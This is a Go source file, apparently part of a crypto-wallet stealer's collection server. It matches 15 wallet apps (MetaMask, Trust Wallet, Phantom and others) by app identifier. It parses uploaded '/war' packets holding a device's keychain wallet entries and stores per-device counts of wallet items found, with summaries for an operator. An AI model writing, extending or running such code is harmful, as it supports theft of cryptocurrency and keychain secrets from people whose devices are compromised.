package store

import (
	"encoding/json"
)

// WalletRule 规则（rule_name ← patterns）。
type WalletRule struct {
	Name     string
	Patterns []string
}

// WALLET_RULES 摘自 pe_worker.js p7_walletRules（15 条，原样提炼）。
var WALLET_RULES = []WalletRule{
	{"bitpie", []string{"bitpie"}},
	{"trustwallet", []string{"sixdays.trust", "group.com.sixdays"}},
	{"imtoken", []string{"im.token"}},
	{"tokenpocket", []string{"tokenpocket"}},
	{"phantom", []string{"app.phantom"}},
	{"uniswap", []string{"uniswap"}},
	{"coinbase", []string{"org.toshi"}},
	{"bitget", []string{"bitkeep"}},
	{"metamask", []string{"io.metamask"}},
	{"okx", []string{"okinc.okex"}},
	{"tronlink", []string{"tronlink"}},
	{"coin98", []string{"coin98"}},
	{"solflare", []string{"solflare"}},
	{"exodus", []string{"exodus"}},
	{"tonkeeper", []string{"tonkeeper", "jbig.tonkeeper"}},
}

// DISPLAY 展示名（前端映射用；未命中的直接用 rule_name）。
var DISPLAY = map[string]string{
	"bitpie": "BitPie", "trustwallet": "Trust Wallet", "imtoken": "imToken",
	"tokenpocket": "TokenPocket", "phantom": "Phantom", "uniswap": "Uniswap",
	"coinbase": "Coinbase Wallet", "bitget": "Bitget", "metamask": "MetaMask",
	"okx": "OKX", "tronlink": "TronLink", "coin98": "Coin98",
	"solflare": "Solflare", "exodus": "Exodus", "tonkeeper": "Tonkeeper",
}

// Display 未命中回落 rule_name。
func Display(rule string) string {
	if d, ok := DISPLAY[rule]; ok {
		return d
	}
	return rule
}

// SeedRules rules 表 UPSERT（幂等）。
func SeedRules() {
	seedRulesOn(GetDB())
}

// seedRulesOn 对指定库 UPSERT 规则（MigrateOnce 用）。
func seedRulesOn(db *DB) {
	if db == nil {
		return
	}
	for _, r := range WALLET_RULES {
		pj, _ := json.Marshal(r.Patterns)
		db.Exec(
			"INSERT INTO wallet_rules(rule_name, patterns) VALUES(?,?)"+
				" ON DUPLICATE KEY UPDATE patterns=VALUES(patterns)",
			r.Name, string(pj))
	}
}

// ProcessWar 解析 /war 包 → wallet_seen 明细快照；返回摘要（无钱包 drop 空表）。
func ProcessWar(body []byte, packetID *int64, srcFile string) map[string]any {
	out := map[string]any{"wallets": []any{}}
	var j map[string]any
	if err := json.Unmarshal(body, &j); err != nil {
		out["ok"] = false
		out["err"] = "bad json"
		return out
	}
	kc, _ := j["keychain"].(map[string]any)
	wallets, _ := kc["wallets"].(map[string]any)
	if wallets == nil {
		out["ok"] = false
		out["err"] = "no keychain.wallets"
		return out
	}
	ts, epoch := Now()
	db := GetDB()
	wlist := []any{}
	for ruleName, val := range wallets {
		var count int
		if vm, ok := val.(map[string]any); ok {
			count = int(toInt(vm["count"]))
			items := asAnySlice(vm["items"])
			if len(items) > 0 && count != len(items) {
				count = len(items)
			}
		} else {
			count = int(toInt(val))
		}
		var pid any
		if packetID != nil {
			pid = *packetID
		}
		SafeCall(func() {
			db.Exec(
				"INSERT IGNORE INTO wallet_seen(ts, epoch, device_uuid, ip, rule_name, count, packet_id, src_file)"+
					" VALUES(?,?,?,?,?,?,?,?)",
				ts, epoch, toStr(j["device_uuid"]), "", ruleName, count, pid, srcFile)
		})
		wlist = append(wlist, map[string]any{"rule": ruleName, "display": Display(ruleName), "count": count})
	}
	out["wallets"] = wlist
	out["ok"] = true
	tables := map[string]any{}
	if t, ok := kc["tables"].(map[string]any); ok {
		for name, tv := range t {
			m, _ := tv.(map[string]any)
			tables[name] = int(toInt(m["count"]))
		}
	}
	out["tables"] = tables
	out["device_uuid"] = j["device_uuid"]
	return out
}

// Summary latest count per wallet（可选按设备过滤）。
func Summary(deviceUUID string, limit int) []map[string]any {
	db := GetDB()
	if deviceUUID != "" {
		return db.Query(
			"SELECT rule_name, MAX(count) AS count, MAX(ts) AS last_ts"+
				" FROM wallet_seen WHERE device_uuid=? GROUP BY rule_name"+
				" ORDER BY count DESC LIMIT ?", deviceUUID, limit)
	}
	return db.Query(
		"SELECT rule_name, MAX(count) AS count, MAX(ts) AS last_ts"+
			" FROM wallet_seen GROUP BY rule_name ORDER BY count DESC LIMIT ?", limit)
}
